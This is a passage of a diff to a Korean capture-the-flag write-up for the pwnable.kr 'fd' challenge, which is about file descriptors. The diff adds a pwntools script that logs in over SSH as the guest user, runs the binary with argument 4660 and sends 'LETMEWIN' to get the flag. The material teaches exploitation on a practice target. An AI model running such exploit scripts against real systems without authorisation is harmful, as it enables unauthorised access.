@@ -94,5 +94,22 @@ ssize_t read(int fd, void *buf, size_t nbytes);
 <img src ="https://user-images.githubusercontent.com/78135526/179387791-b3cbaa66-847e-46e4-ae48-278c9ffadd1d.png" width = 350>
 </p>
 
+```Python
+from pwn import *
+p = ssh("fd","pwnable.kr",2222,"guest")
+path = "/home/fd/fd"
+argv = "4660"
+payload = [path,argv]
+s = p.run(payload)
+s.sendline('LETMEWIN')
+s.interactive()
+```
+* 위 코드처럼 Pwntools을 이용해서도 값을 전송할 수 있다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/179391379-b5f1f116-29b7-4b4b-b5a8-efaa64d7ee90.png" width = 350>
+</p>
+
 * 0x1234를 10진수로 변환하면 **4660**이란 숫자가 나온다. `./fd 4660`으로 실행해보면 flag 값이 나온다. 이렇게 파일 디스크립터를 알아봤다 !
+
 
